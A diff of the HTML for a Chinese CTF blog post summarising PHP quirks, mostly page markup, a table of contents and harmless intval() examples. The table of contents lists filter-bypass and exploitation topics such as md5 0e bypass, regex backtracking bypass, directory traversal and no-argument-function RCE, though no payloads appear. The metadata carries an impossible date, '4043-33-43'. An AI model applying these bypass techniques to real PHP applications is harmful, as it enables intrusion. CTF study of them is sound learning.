@@ -1,5 +1,5 @@
 <!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[PHP特性]总结 - Nexuzzz0</title><meta name=Description content="Nexuzzz0's BLOG"><meta property="og:title" content="[PHP特性]总结">
-<meta property="og:description" content="正则表达式 元字符 模式修正符 intval() <?php echo intval(42); // 42 echo intval(4.2); // 4 echo intval('42'); // 42 echo intval('+42'); // 42 echo intval('-42'); // -42 echo intval(042); // 34 八进制 echo intval('042'); // 42 echo intval(1e10); // 1410065408 echo intval('1e10'); // 1 echo intval(0x1A); // 26 十六进制 echo intval(42000000); // 42000000 echo intval(420000000000000000000); // 0"><meta property="og:type" content="article"><meta property="og:url" content="https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/"><meta property="og:image" content="https://nexuzzz0.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-04T15:26:53+08:00"><meta property="article:modified_time" content="2024-03-04T15:26:53+08:00"><meta property="og:site_name" content="Nexuzzz0's BLOG"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nexuzzz0.github.io/logo.png"><meta name=twitter:title content="[PHP特性]总结"><meta name=twitter:description content="正则表达式 元字符 模式修正符 intval() <?php echo intval(42); // 42 echo intval(4.2); // 4 echo intval('42'); // 42 echo intval('+42'); // 42 echo intval('-42'); // -42 echo intval(042); // 34 八进制 echo intval('042'); // 42 echo intval(1e10); // 1410065408 echo intval('1e10'); // 1 echo intval(0x1A); // 26 十六进制 echo intval(42000000); // 42000000 echo intval(420000000000000000000); // 0"><meta name=application-name content="Nexuzzz0's BLOG"><meta name=apple-mobile-web-app-title content="Nexuzzz0's BLOG"><meta name=theme-color content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/><link rel=prev href=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/color.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[PHP特性]总结","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/nexuzzz0.github.io\/posts\/php%E7%89%B9%E6%80%A7\/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93\/"},"genre":"posts","keywords":"反序列化, PHP","wordcount":9255,"url":"https:\/\/nexuzzz0.github.io\/posts\/php%E7%89%B9%E6%80%A7\/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93\/","datePublished":"2024-03-04T15:26:53+08:00","dateModified":"2024-03-04T15:26:53+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Nexuzzz0"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark"),window.theme=e,window.isDark=window.theme!=="light"}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"||"auto"==="black"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")],window.switchThemeEventSet=new Set</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=desktop-header-typeit class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/friend/ title=Friend>友链 </a><a class=menu-item href=/about/ title=About>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<meta property="og:description" content="正则表达式 元字符 模式修正符 intval() intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 <?php echo intval(42); // 42 echo intval(4.2); // 4 echo intval('42'); // 42 echo intval('+42'); // 42 echo intval('-42'); // -42 echo intval(042); // 34 八进制 echo intval('042'); // 42"><meta property="og:type" content="article"><meta property="og:url" content="https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/"><meta property="og:image" content="https://nexuzzz0.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-04T15:26:53+08:00"><meta property="article:modified_time" content="2024-03-04T15:26:53+08:00"><meta property="og:site_name" content="Nexuzzz0's BLOG"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nexuzzz0.github.io/logo.png"><meta name=twitter:title content="[PHP特性]总结"><meta name=twitter:description content="正则表达式 元字符 模式修正符 intval() intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 <?php echo intval(42); // 42 echo intval(4.2); // 4 echo intval('42'); // 42 echo intval('+42'); // 42 echo intval('-42'); // -42 echo intval(042); // 34 八进制 echo intval('042'); // 42"><meta name=application-name content="Nexuzzz0's BLOG"><meta name=apple-mobile-web-app-title content="Nexuzzz0's BLOG"><meta name=theme-color content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/><link rel=prev href=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/><link rel=next href=https://nexuzzz0.github.io/posts/python/ssti%E6%80%BB%E7%BB%93/><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/color.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[PHP特性]总结","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/nexuzzz0.github.io\/posts\/php%E7%89%B9%E6%80%A7\/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93\/"},"genre":"posts","keywords":"反序列化, PHP","wordcount":10075,"url":"https:\/\/nexuzzz0.github.io\/posts\/php%E7%89%B9%E6%80%A7\/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93\/","datePublished":"2024-03-04T15:26:53+08:00","dateModified":"2024-03-04T15:26:53+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Nexuzzz0"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark"),window.theme=e,window.isDark=window.theme!=="light"}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"||"auto"==="black"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")],window.switchThemeEventSet=new Set</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=desktop-header-typeit class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/friend/ title=Friend>友链 </a><a class=menu-item href=/about/ title=About>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
 <input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
 <a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i>
 </a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i>
@@ -10,9 +10,9 @@
 </a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i>
 </a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/friend/ title=Friend>友链</a><a class=menu-item href=/about/ title=About>关于</a><a href=javascript:void(0); class="menu-item theme-select" title=切换主题>
 <i class="fas fa-adjust fa-fw"></i>
-<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#正则表达式>正则表达式</a><ul><li><a href=#元字符>元字符</a></li><li><a href=#模式修正符>模式修正符</a></li></ul></li><li><a href=#intval>intval()</a><ul><li><a href=#字符绕过>字符绕过</a></li><li><a href=#科学计数法>科学计数法</a></li><li><a href=#进制转换>进制转换</a></li><li><a href=#小数点绕过>小数点绕过</a></li></ul></li><li><a href=#strpos>strpos()</a></li><li><a href=#preg_match>preg_match()</a><ul><li><a href=#单行多行匹配>单行/多行匹配</a></li></ul></li></ul><ul><li><ul><li><a href=#数组绕过>数组绕过</a></li><li><a href=#正则回溯绕过>正则回溯绕过</a></li></ul></li><li><a href=#in_array>in_array()</a></li><li><a href=#is_numeric>is_numeric()</a></li><li><a href=#ereg>ereg()</a><ul><li><a href=#00-截断>%00 截断</a></li><li><a href=#数组截断>数组截断</a></li></ul></li><li><a href=#trim>trim()</a></li><li><a href=#strrev>strrev()</a></li><li><a href=#md5sha1-绕过>MD5/sha1 绕过(==、===)</a><ul><li><a href=#0e绕过>0E绕过</a></li><li><a href=#数组绕过-1>数组绕过</a></li><li><a href=#md5碰撞>md5碰撞</a></li><li><a href=#passwordmd5passtrue绕过>password=md5($pass,true)绕过</a></li></ul></li><li><a href=#目录穿越>目录穿越</a></li><li><a href=#伪协议>伪协议</a></li><li><a href=#is_file目录溢出><code>is_file</code>目录溢出</a></li><li><a href=#三元运算符>三元运算符</a></li><li><a href=#位运算>位运算</a></li><li><a href=#函数与数字运算>函数与数字运算</a></li><li><a href=#变量覆盖>变量覆盖</a><ul><li><a href=#变量覆盖函数>变量覆盖函数</a></li><li><a href=#heading><code>$$</code></a></li><li><a href=#extract><code>extract()</code></a></li><li><a href=#parse_str><code>parse_str()</code></a></li></ul></li><li><a href=#非法变量名转换>非法变量名转换</a></li><li><a href=#不加引号的字符串>不加引号的字符串</a></li><li><a href=#反引号内引用变量>反引号内引用变量</a></li><li><a href=#globalsget_defined_vars>$GLOBALS/get_defined_vars()</a></li><li><a href=#_serverargv-与-_serverquery_string>$_SERVER[&lsquo;argv&rsquo;] 与 $_SERVER[&lsquo;QUERY_STRING&rsquo;]</a></li><li><a href=#assert>assert()</a></li><li><a href=#不含字母数字的函数gettext拓展>不含字母数字的函数(gettext()拓展)</a></li><li><a href=#原生类列目录rce>原生类列目录/RCE</a></li><li><a href=#无参数函数读文件rce>无参数函数读文件/RCE</a></li><li><a href=#nlcpmvtee写文件>nl、cp、mv、tee写文件</a></li><li><a href=#静态调用方法>静态调用方法</a></li><li><a href=#call_user_func>call_user_func()</a></li><li><a href=#create_function>create_function()</a></li><li><a href=#根命名空间--绕过过滤>根命名空间 \ 绕过过滤</a></li><li><a href=#__autoload-和-class_exists>__autoload 和 class_exists()</a></li><li><a href=#属性类型不敏感>属性类型不敏感</a></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[PHP特性]总结</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class="author fas fa-user-circle fa-fw"></span><a href=/ title=Author rel=author class=author>Nexuzzz0</a>
-</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=4043-33-43>4043-33-43</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=4043-33-43>4043-33-43</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 9255 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 19 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
-<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#正则表达式>正则表达式</a><ul><li><a href=#元字符>元字符</a></li><li><a href=#模式修正符>模式修正符</a></li></ul></li><li><a href=#intval>intval()</a><ul><li><a href=#字符绕过>字符绕过</a></li><li><a href=#科学计数法>科学计数法</a></li><li><a href=#进制转换>进制转换</a></li><li><a href=#小数点绕过>小数点绕过</a></li></ul></li><li><a href=#strpos>strpos()</a></li><li><a href=#preg_match>preg_match()</a><ul><li><a href=#单行多行匹配>单行/多行匹配</a></li></ul></li></ul><ul><li><ul><li><a href=#数组绕过>数组绕过</a></li><li><a href=#正则回溯绕过>正则回溯绕过</a></li></ul></li><li><a href=#in_array>in_array()</a></li><li><a href=#is_numeric>is_numeric()</a></li><li><a href=#ereg>ereg()</a><ul><li><a href=#00-截断>%00 截断</a></li><li><a href=#数组截断>数组截断</a></li></ul></li><li><a href=#trim>trim()</a></li><li><a href=#strrev>strrev()</a></li><li><a href=#md5sha1-绕过>MD5/sha1 绕过(==、===)</a><ul><li><a href=#0e绕过>0E绕过</a></li><li><a href=#数组绕过-1>数组绕过</a></li><li><a href=#md5碰撞>md5碰撞</a></li><li><a href=#passwordmd5passtrue绕过>password=md5($pass,true)绕过</a></li></ul></li><li><a href=#目录穿越>目录穿越</a></li><li><a href=#伪协议>伪协议</a></li><li><a href=#is_file目录溢出><code>is_file</code>目录溢出</a></li><li><a href=#三元运算符>三元运算符</a></li><li><a href=#位运算>位运算</a></li><li><a href=#函数与数字运算>函数与数字运算</a></li><li><a href=#变量覆盖>变量覆盖</a><ul><li><a href=#变量覆盖函数>变量覆盖函数</a></li><li><a href=#heading><code>$$</code></a></li><li><a href=#extract><code>extract()</code></a></li><li><a href=#parse_str><code>parse_str()</code></a></li></ul></li><li><a href=#非法变量名转换>非法变量名转换</a></li><li><a href=#不加引号的字符串>不加引号的字符串</a></li><li><a href=#反引号内引用变量>反引号内引用变量</a></li><li><a href=#globalsget_defined_vars>$GLOBALS/get_defined_vars()</a></li><li><a href=#_serverargv-与-_serverquery_string>$_SERVER[&lsquo;argv&rsquo;] 与 $_SERVER[&lsquo;QUERY_STRING&rsquo;]</a></li><li><a href=#assert>assert()</a></li><li><a href=#不含字母数字的函数gettext拓展>不含字母数字的函数(gettext()拓展)</a></li><li><a href=#原生类列目录rce>原生类列目录/RCE</a></li><li><a href=#无参数函数读文件rce>无参数函数读文件/RCE</a></li><li><a href=#nlcpmvtee写文件>nl、cp、mv、tee写文件</a></li><li><a href=#静态调用方法>静态调用方法</a></li><li><a href=#call_user_func>call_user_func()</a></li><li><a href=#create_function>create_function()</a></li><li><a href=#根命名空间--绕过过滤>根命名空间 \ 绕过过滤</a></li><li><a href=#__autoload-和-class_exists>__autoload 和 class_exists()</a></li><li><a href=#属性类型不敏感>属性类型不敏感</a></li></ul></nav></div></div><div class=content id=content><h2 id=正则表达式 class=headerLink><a href=#%e6%ad%a3%e5%88%99%e8%a1%a8%e8%be%be%e5%bc%8f class=header-mark></a>正则表达式</h2><h3 id=元字符 class=headerLink><a href=#%e5%85%83%e5%ad%97%e7%ac%a6 class=header-mark></a>元字符</h3><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621404.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621404.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621404.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621404.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621404.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621404.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621404.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621404.png></a></figure></p><h3 id=模式修正符 class=headerLink><a href=#%e6%a8%a1%e5%bc%8f%e4%bf%ae%e6%ad%a3%e7%ac%a6 class=header-mark></a>模式修正符</h3><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621297.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621297.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621297.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621297.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621297.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621297.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621297.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621297.png></a></figure></p><h2 id=intval class=headerLink><a href=#intval class=header-mark></a>intval()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621245.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621245.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621245.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621245.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621245.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621245.png 2x" sizes=auto alt=image.png></a></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#正则表达式>正则表达式</a><ul><li><a href=#元字符>元字符</a></li><li><a href=#模式修正符>模式修正符</a></li></ul></li><li><a href=#intval>intval()</a><ul><li><a href=#字符绕过>字符绕过</a></li><li><a href=#科学计数法>科学计数法</a></li><li><a href=#进制转换>进制转换</a></li><li><a href=#小数点绕过>小数点绕过</a></li></ul></li><li><a href=#strpos>strpos()</a></li><li><a href=#str_replace>str_replace</a></li><li><a href=#preg_replace>preg_replace()</a><ul><li><a href=#修饰符>修饰符</a></li></ul></li><li><a href=#preg_match>preg_match()</a><ul><li><a href=#单行多行匹配>单行/多行匹配</a></li></ul></li></ul><ul><li><ul><li><a href=#数组绕过>数组绕过</a></li><li><a href=#正则回溯绕过>正则回溯绕过</a></li></ul></li><li><a href=#in_array>in_array()</a></li><li><a href=#is_numeric>is_numeric()</a></li><li><a href=#ereg>ereg()</a><ul><li><a href=#00-截断>%00 截断</a></li><li><a href=#数组截断>数组截断</a></li></ul></li><li><a href=#trim>trim()</a></li><li><a href=#strrev>strrev()</a></li><li><a href=#md5sha1-绕过>MD5/sha1 绕过(==、===)</a><ul><li><a href=#0e绕过>0E绕过</a></li><li><a href=#数组绕过-1>数组绕过</a></li><li><a href=#md5碰撞>md5碰撞</a></li><li><a href=#passwordmd5passtrue绕过>password=md5($pass,true)绕过</a></li><li><a href=#md5长度扩展攻击哈希长度攻击>md5长度扩展攻击（哈希长度攻击）</a></li></ul></li><li><a href=#目录穿越>目录穿越</a></li><li><a href=#伪协议>伪协议</a></li><li><a href=#is_file目录溢出><code>is_file</code>目录溢出</a></li><li><a href=#三元运算符>三元运算符</a></li><li><a href=#位运算>位运算</a></li><li><a href=#函数与数字运算>函数与数字运算</a></li><li><a href=#变量覆盖>变量覆盖</a><ul><li><a href=#变量覆盖函数>变量覆盖函数</a></li><li><a href=#heading><code>$$</code></a></li><li><a href=#extract><code>extract()</code></a></li><li><a href=#parse_str><code>parse_str()</code></a></li></ul></li><li><a href=#非法变量名转换>非法变量名转换</a></li><li><a href=#不加引号的字符串>不加引号的字符串</a></li><li><a href=#反引号内引用变量>反引号内引用变量</a></li><li><a href=#globalsget_defined_vars>$GLOBALS/get_defined_vars()</a></li><li><a href=#_serverargv-与-_serverquery_string>$_SERVER[&lsquo;argv&rsquo;] 与 $_SERVER[&lsquo;QUERY_STRING&rsquo;]</a></li><li><a href=#assert>assert()</a></li><li><a href=#不含字母数字的函数gettext拓展>不含字母数字的函数(gettext()拓展)</a></li><li><a href=#解析特性>解析特性</a></li><li><a href=#原生类列目录rce>原生类列目录/RCE</a></li><li><a href=#无参数函数读文件rce>无参数函数读文件/RCE</a></li><li><a href=#nlcpmvtee写文件>nl、cp、mv、tee写文件</a></li><li><a href=#静态调用方法>静态调用方法</a></li><li><a href=#call_user_func>call_user_func()</a></li><li><a href=#create_function>create_function()</a></li><li><a href=#根命名空间--绕过过滤>根命名空间 \ 绕过过滤</a></li><li><a href=#__autoload-和-class_exists>__autoload 和 class_exists()</a></li><li><a href=#属性类型不敏感>属性类型不敏感</a></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[PHP特性]总结</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class="author fas fa-user-circle fa-fw"></span><a href=/ title=Author rel=author class=author>Nexuzzz0</a>
+</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=4043-33-43>4043-33-43</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=4043-33-43>4043-33-43</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 10075 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 21 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#正则表达式>正则表达式</a><ul><li><a href=#元字符>元字符</a></li><li><a href=#模式修正符>模式修正符</a></li></ul></li><li><a href=#intval>intval()</a><ul><li><a href=#字符绕过>字符绕过</a></li><li><a href=#科学计数法>科学计数法</a></li><li><a href=#进制转换>进制转换</a></li><li><a href=#小数点绕过>小数点绕过</a></li></ul></li><li><a href=#strpos>strpos()</a></li><li><a href=#str_replace>str_replace</a></li><li><a href=#preg_replace>preg_replace()</a><ul><li><a href=#修饰符>修饰符</a></li></ul></li><li><a href=#preg_match>preg_match()</a><ul><li><a href=#单行多行匹配>单行/多行匹配</a></li></ul></li></ul><ul><li><ul><li><a href=#数组绕过>数组绕过</a></li><li><a href=#正则回溯绕过>正则回溯绕过</a></li></ul></li><li><a href=#in_array>in_array()</a></li><li><a href=#is_numeric>is_numeric()</a></li><li><a href=#ereg>ereg()</a><ul><li><a href=#00-截断>%00 截断</a></li><li><a href=#数组截断>数组截断</a></li></ul></li><li><a href=#trim>trim()</a></li><li><a href=#strrev>strrev()</a></li><li><a href=#md5sha1-绕过>MD5/sha1 绕过(==、===)</a><ul><li><a href=#0e绕过>0E绕过</a></li><li><a href=#数组绕过-1>数组绕过</a></li><li><a href=#md5碰撞>md5碰撞</a></li><li><a href=#passwordmd5passtrue绕过>password=md5($pass,true)绕过</a></li><li><a href=#md5长度扩展攻击哈希长度攻击>md5长度扩展攻击（哈希长度攻击）</a></li></ul></li><li><a href=#目录穿越>目录穿越</a></li><li><a href=#伪协议>伪协议</a></li><li><a href=#is_file目录溢出><code>is_file</code>目录溢出</a></li><li><a href=#三元运算符>三元运算符</a></li><li><a href=#位运算>位运算</a></li><li><a href=#函数与数字运算>函数与数字运算</a></li><li><a href=#变量覆盖>变量覆盖</a><ul><li><a href=#变量覆盖函数>变量覆盖函数</a></li><li><a href=#heading><code>$$</code></a></li><li><a href=#extract><code>extract()</code></a></li><li><a href=#parse_str><code>parse_str()</code></a></li></ul></li><li><a href=#非法变量名转换>非法变量名转换</a></li><li><a href=#不加引号的字符串>不加引号的字符串</a></li><li><a href=#反引号内引用变量>反引号内引用变量</a></li><li><a href=#globalsget_defined_vars>$GLOBALS/get_defined_vars()</a></li><li><a href=#_serverargv-与-_serverquery_string>$_SERVER[&lsquo;argv&rsquo;] 与 $_SERVER[&lsquo;QUERY_STRING&rsquo;]</a></li><li><a href=#assert>assert()</a></li><li><a href=#不含字母数字的函数gettext拓展>不含字母数字的函数(gettext()拓展)</a></li><li><a href=#解析特性>解析特性</a></li><li><a href=#原生类列目录rce>原生类列目录/RCE</a></li><li><a href=#无参数函数读文件rce>无参数函数读文件/RCE</a></li><li><a href=#nlcpmvtee写文件>nl、cp、mv、tee写文件</a></li><li><a href=#静态调用方法>静态调用方法</a></li><li><a href=#call_user_func>call_user_func()</a></li><li><a href=#create_function>create_function()</a></li><li><a href=#根命名空间--绕过过滤>根命名空间 \ 绕过过滤</a></li><li><a href=#__autoload-和-class_exists>__autoload 和 class_exists()</a></li><li><a href=#属性类型不敏感>属性类型不敏感</a></li></ul></nav></div></div><div class=content id=content><h2 id=正则表达式 class=headerLink><a href=#%e6%ad%a3%e5%88%99%e8%a1%a8%e8%be%be%e5%bc%8f class=header-mark></a>正则表达式</h2><h3 id=元字符 class=headerLink><a href=#%e5%85%83%e5%ad%97%e7%ac%a6 class=header-mark></a>元字符</h3><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105082.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105082.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105082.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105082.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105082.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105082.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105082.png 2x" sizes=auto 